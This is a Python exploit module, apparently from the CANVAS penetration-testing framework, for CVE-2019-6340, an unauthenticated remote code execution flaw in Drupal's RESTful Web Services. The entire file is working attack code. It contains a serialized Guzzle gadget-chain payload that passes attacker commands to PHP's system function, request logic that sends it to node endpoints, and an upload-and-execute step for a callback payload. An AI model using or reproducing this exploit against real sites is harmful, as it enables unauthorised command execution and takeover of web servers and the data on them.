#!/usr/bin/env python2
import sys
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit
from ExploitTypes.CommandLineExecuter import CommandExploit

from libs.spkproxy import urlopen



NAME                            = 'CVE-2019-6340'
DESCRIPTION                     = 'RCE on Drupal core when RESTful Web Services is enabled'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Drupal"
DOCUMENTATION["Repeatability"]  = 'Infinite'
DOCUMENTATION["CVE Name"]       = 'CVE-2019-6340'
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-6340"
DOCUMENTATION["References"]     = "https://www.drupal.org/sa-core-2019-003"
DOCUMENTATION["Date public"]    = "22/02/2019"
DOCUMENTATION["NOTES"]          = """
An unauthenticated unserialization bug can be exploited on the RESTful Web
Services module on the Drupal core for the following versions:
* 7.X (Depends on enabled third party modules)
* 8.5.X < 8.5.11
* 8.6.X < 8.6.10
"""

VERSION                         = "0.1"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Serverside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

TARGETS = { 0 : ['PHP']}


class NodeNotFound(Exception):
    pass

class MissingHostname(Exception):
    pass

class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)

        self.name = NAME
        self.path = os.path.dirname(__file__)
        self.mosdef_type = "PHP"
        self.payloadType = 0

        self.host = ""
        self.hostname = ''
        self.port = 80
        self.https = False
        self.hostname = None
        self.path = ''
        self.ua = None

        self.node_id = 1
        self.failed_attempts = 0

        self.basicauth_user = ""
        self.basicauth_password = ""

        # CommandExploit
        self.supports_universal = True 


    #def neededListenerTypes(self):
    #    return [canvasengine.UNIVERSAL_MOSDEF]

    def neededListenerTypes(self):
        return self.cle_neededListenerTypes()   

    def getargs(self):

        self.host = self.target.interface
        self.hostname = self.argsDict.get('hostname', self.hostname)
        self.port = int(self.argsDict.get("port", self.port))
        self.getarg('https')
        self.getarg('path')
        self.path = self.path.strip('/')

        self.getarg('basicauth_user')
        self.getarg('basicauth_password')
        self.basicauth = self.basicauth_user != ''

        if self.hostname == '' or self.hostname is None:
            raise MissingHostname

    def make_mosdef(self, command):
        '''
        Create the MOSDEF payload to trigger in the unserialize
        This payload is used in an unserialize gadget for Guzzle
        '''
        logging.debug('Creating mosdef payload')
        logging.debug('\tIP: {}\n\tPort: {}'.format(self.callback.ip, self.callback.port))
        self.mosdef = command.replace('"', '\\"').replace('\\','\\\\')

    def send_request(self, url, postdata, auth):
        '''
        We need to send a "POST" request but using the "GET" verb
        Also we need response headers
        '''

        headers = []# self.getExtraHeaders()
        headers.append(('Content-Type', 'application/hal+json'))
        (fd, code) = urlopen(url,
                     data=postdata,
                     verb='GET',
                     exploit=self,
                     hostname=self.hostname,
                     auth=auth,
                     extraheaders=headers,
                     noresponse=False,
                     entireresponse=True,
                     return_response_code=True
                    )
        return (fd.read(), code)

    def send_payload(self):
        auth = None
        if self.basicauth:
            logging.debug('Using basic auth {}:{}'.format(self.basicauth_user,
                                                          self.basicauth_password))
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)

        url = 'https' if self.https else 'http'
        url += '://' + self.hostname
        url += ':' + str(self.port)
        url += self.path
        url += '/node/' + str(self.node_id) + '?_format=hal_json'

        postdata = '''{
  "link": [
    {
      "value": "link",
      "options":
          "O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:{s:33:\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\";a:1:{s:5:\\"close\\";a:2:{i:0;O:23:\\"GuzzleHttp\\\\HandlerStack\\":3:{s:32:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\";s:{{len}}:\\"{{payload}}\\";s:30:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\";a:1:{i:0;a:1:{i:0;s:6:\\"system\\";}}s:31:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\";b:0;}i:1;s:7:\\"resolve\\";}}s:9:\\"_fn_close\\";a:2:{i:0;r:4;i:1;s:7:\\"resolve\\";}}"
    }
  ],
  "_links": {
    "type": {
      "href": "{{target}}/rest/type/shortcut/default"
    }
  }
}'''

        postdata = postdata.replace('{{len}}', str(len(self.mosdef)))
        postdata = postdata.replace('{{payload}}', self.mosdef)
        target = 'https' if self.https else 'http'
        target += '://' + self.hostname
        target += ':' + str(self.port) if self.port not in (80, 443) else ''
        target += self.path if self.path else ''
        postdata = postdata.replace('{{target}}', target)

        logging.debug('Sending MOSDEF payload')

        (response, code) = self.send_request(url, postdata, auth)

        logging.debug('Sent')

        if 'X-Drupal-Cache: HIT' in response:
            logging.debug('Cached response, trying next node')
            self.node_id += 1
            return False

        if code == 404:
            self.failed_attempts += 1
            logging.warn('Valid Node ID not found')
            if self.failed_attempts >= 3:
                raise NodeNotFound
        logging.info("Found valid Node ID: %d" % self.node_id)
        return True

    def run_blind_command(self, command):
        self.make_mosdef(command)
        while not self.send_payload(): pass
        logging.info("Command executed: %s" % command)
        return True


    def run(self):
        self.setProgress(0)
        result = False
        try:
            self.getargs()
            self.getargs_cle()
            self.setInfo("{} attacking {}:{} (in progress)".format(self.name, self.hostname, self.port))
            logging.info("Trying to determine if target is vulnerable")
            self.get_os()
            self.setProgress(33)
            if self.target_os:
                logging.info("The target appears to be vulnerable. OS: {}".format(self.target_os))
                if self.upload_and_execute(encoded=True):
                    result = True
            else:
                logging.error("Target %s is not vulnerable" % self.host)

        except NodeNotFound:
            logging.error('Three consecutive nodes were not found. Exiting')
        except MissingHostname:
            logging.error('Hostname parameter is mandatory')

        if result:
            self.setProgress(100)
            self.setInfo("{} in {}:{} done (success)".format(self.name, self.hostname, self.port))
            return True
        else:
            self.setInfo("{} in {}:{} done (failed)".format(self.name, self.hostname, self.port))
            self.setProgress(-1)
            return False

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

